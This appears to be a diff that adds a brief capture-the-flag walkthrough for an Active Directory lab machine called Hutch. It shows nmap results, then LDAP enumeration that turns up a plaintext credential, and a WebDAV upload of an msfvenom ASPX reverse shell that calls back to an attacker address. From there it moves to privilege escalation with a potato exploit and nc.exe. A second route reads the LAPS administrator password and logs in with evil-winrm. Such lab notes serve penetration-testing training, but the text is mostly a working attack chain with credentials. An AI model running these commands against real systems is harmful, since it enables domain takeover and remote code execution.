@@ -1,0 +1,77 @@
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT
+|_  Potentially risky methods: TRACE COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT
+| http-webdav-scan: 
+|   WebDAV type: Unknown
+|   Server Date: Thu, 23 Apr 2026 02:26:24 GMT
+|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
+|   Server Type: Microsoft-IIS/10.0
+|_  Public Options: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK
+|_http-title: IIS Windows Server
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-23 02:25:36Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+49666/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49674/tcp open  msrpc         Microsoft Windows RPC
+49676/tcp open  msrpc         Microsoft Windows RPC
+49692/tcp open  msrpc         Microsoft Windows RPC
+49763/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: HUTCHDC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2026-04-23T02:26:25
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+
+
+$ ldapsearch -H ldap://192.168.232.122 -b 'CN=Users,DC=hutch,DC=offsec' -x
+found credential
+fmcsorley
+CrabSharkJellyfish192
+
+$ davtest -url http://192.168.232.122 -auth fmcsorley:CrabSharkJellyfish192
+Found can PUT , EXEC
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.201 LPORT=4444 -f aspx -o shell.aspx
+$ curl -X PUT http://192.168.232.122/shell.aspx --data-binary @shell.aspx -u fmcsorley:CrabSharkJellyfish192
+Then brower go to http://192.168.232.122/shell.aspx
+Get reverse shell. Found SeInpersonatePrivilege. upload potato and nc.exe . get an SYSTEM shell.
+
+----------------------------------------------------------------------------------
+Method 2: 
+
+ldapsearch -x -H ldap://192.168.232.122 -D "fmcsorley@hutch.offsec" -w 'CrabSharkJellyfish192' -b "DC=hutch,DC=offsec" "(sAMAccountName=HUTCHDC$)" ms-Mcs-AdmPwd
+
+# HUTCHDC, Domain Controllers, hutch.offsec
+dn: CN=HUTCHDC,OU=Domain Controllers,DC=hutch,DC=offsec
+ms-Mcs-AdmPwd: wF0ot+8+W]OF9#
+
+Found clear text password, direct login
+evil-winrm -i 192.168.232.122 -u Administrator -p 'wF0ot+8+W]OF9#'
+
+##########################################################################################
+
+
+
+
+
